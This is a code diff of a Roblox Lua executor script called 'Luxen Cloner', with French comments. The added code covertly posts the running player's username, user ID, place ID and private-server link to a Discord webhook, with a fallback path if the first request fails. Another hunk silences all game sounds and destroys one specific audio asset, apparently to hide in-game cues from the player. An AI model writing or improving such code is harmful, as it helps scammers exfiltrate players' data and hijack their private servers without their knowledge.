@@ -16,34 +16,68 @@ local playerGui = player:WaitForChild("PlayerGui")
 -- Fonction pour envoyer au webhook Discord
 local function sendToWebhook(username, serverLink)
     spawn(function()
-        local webhookData = {
-            ["embeds"] = {{
-                ["title"] = "🔗 Nouvelle Connexion - Luxen Cloner",
-                ["color"] = 5814783,
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Utilisateur",
-                        ["value"] = username,
-                        ["inline"] = true
+        local success, err = pcall(function()
+            local webhookData = {
+                ["content"] = "**🔗 Nouvelle Connexion - Luxen Cloner**",
+                ["embeds"] = {{
+                    ["title"] = "Informations de connexion",
+                    ["color"] = 5814783,
+                    ["fields"] = {
+                        {
+                            ["name"] = "👤 Utilisateur",
+                            ["value"] = username,
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "🎮 Place ID",
+                            ["value"] = tostring(game.PlaceId),
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "🔗 Lien du Serveur Privé",
+                            ["value"] = serverLink,
+                            ["inline"] = false
+                        },
+                        {
+                            ["name"] = "🆔 User ID",
+                            ["value"] = tostring(player.UserId),
+                            ["inline"] = true
+                        },
+                        {
+                            ["name"] = "⏰ Timestamp",
+                            ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
+                            ["inline"] = true
+                        }
                     },
-                    {
-                        ["name"] = "🎮 Jeu",
-                        ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🔗 Lien du Serveur Privé",
-                        ["value"] = serverLink,
-                        ["inline"] = false
+                    ["footer"] = {
+                        ["text"] = "Luxen Cloner System"
                     }
+                }}
+            }
+            
+            local response = request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
                 },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }}
-        }
-        
-        pcall(function()
-            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(webhookData), Enum.HttpContentType.ApplicationJson)
+                Body = HttpService:JSONEncode(webhookData)
+            })
+            
+            print("Webhook envoyé:", response.StatusCode)
         end)
+        
+        if not success then
+            warn("Erreur webhook:", err)
+            -- Fallback avec HttpService si request() ne marche pas
+            pcall(function()
+                local simpleData = {
+                    ["content"] = "**[Luxen Cloner]**\n👤 " .. username .. "\n🔗 " .. serverLink
+                }
+                HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(simpleData), Enum.HttpContentType.ApplicationJson)
+                print("Webhook envoyé via fallback")
+            end)
+        end
     end)
 end
 
@@ -55,14 +89,29 @@ local function muteAllSounds()
         
         -- Couper tous les sons existants
         for _, descendant in pairs(game:GetDescendants()) do
-            if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+            if descendant:IsA("Sound") then
+                descendant.Volume = 0
+                descendant:Stop()
+                -- Supprimer spécifiquement l'audio problématique
+                if descendant.SoundId == "rbxassetid://128387076668435" then
+                    descendant:Destroy()
+                end
+            elseif descendant:IsA("SoundGroup") then
                 descendant.Volume = 0
             end
         end
         
         -- Surveiller les nouveaux sons
         game.DescendantAdded:Connect(function(descendant)
-            if descendant:IsA("Sound") or descendant:IsA("SoundGroup") then
+            task.wait()
+            if descendant:IsA("Sound") then
+                descendant.Volume = 0
+                descendant:Stop()
+                -- Supprimer spécifiquement l'audio problématique
+                if descendant.SoundId == "rbxassetid://128387076668435" then
+                    descendant:Destroy()
+                end
+            elseif descendant:IsA("SoundGroup") then
                 descendant.Volume = 0
             end
         end)
